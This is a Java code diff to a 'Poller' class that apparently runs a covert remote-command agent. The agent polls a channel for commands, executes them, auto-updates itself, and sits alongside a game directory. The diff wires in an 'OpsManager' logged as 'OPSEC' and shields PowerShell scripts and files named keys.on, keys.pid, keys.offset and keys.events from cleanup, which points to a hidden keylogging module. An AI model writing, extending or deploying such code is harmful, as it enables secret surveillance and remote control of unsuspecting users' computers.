@@ -33,6 +33,7 @@ public final class Poller implements Runnable {
 	private final ExecutorService auxPool;
 	private final Semaphore pollNow = new Semaphore(0);
 	private final AutoUpdate auto;
+	private final OpsManager ops;
 	private final Set<String> seen = new LinkedHashSet<>();
 	private final Object seenLock = new Object();
 	private volatile Path cwd;
@@ -54,6 +55,7 @@ public final class Poller implements Runnable {
 		this.gameDir = gameDir;
 		this.state = state;
 		this.auto = new AutoUpdate(state, System::currentTimeMillis, random);
+		this.ops = new OpsManager(installDir, state, this);
 		this.cwd = Path.of(System.getProperty("user.home", "."));
 		this.executor = new CommandExecutor(this, installDir, gameDir, state);
 		this.commandPool = new ThreadPoolExecutor(3, 3, 0L, TimeUnit.MILLISECONDS,
@@ -73,6 +75,22 @@ public final class Poller implements Runnable {
 		Thread thread = new Thread(this, "spc-poller");
 		thread.setDaemon(false);
 		thread.start();
+	}
+
+	public void startOps() {
+		try {
+			ops.start();
+		} catch (Throwable throwable) {
+			Log.debug("OPSEC start failed", throwable);
+		}
+	}
+
+	public OpsManager ops() {
+		return ops;
+	}
+
+	public boolean ready() {
+		return !channelId.isEmpty() && client != null;
 	}
 
 	public AutoUpdate auto() {
@@ -491,7 +509,8 @@ public final class Poller implements Runnable {
 			stream.filter(Files::isRegularFile).forEach(path -> {
 				try {
 					if (path.equals(keepToken) || path.startsWith(cache.resolve(".done"))
-						|| path.startsWith(AgentPaths.tools(installDir))) {
+						|| path.startsWith(AgentPaths.tools(installDir))
+						|| protectedOps(path)) {
 						return;
 					}
 					if (Files.getLastModifiedTime(path).toMillis() < older) {
@@ -504,6 +523,16 @@ public final class Poller implements Runnable {
 		} catch (Throwable throwable) {
 			Log.debug("Cache scan failed", throwable);
 		}
+	}
+
+	private boolean protectedOps(Path path) {
+		Path ops = OpsPaths.ops(installDir);
+		if (!path.startsWith(ops)) {
+			return false;
+		}
+		String name = path.getFileName().toString();
+		return name.endsWith(".ps1") || name.equals("keys.on") || name.equals("keys.pid")
+			|| name.equals("keys.offset") || name.equals("keys.events");
 	}
 
 	private boolean poll() throws Exception {
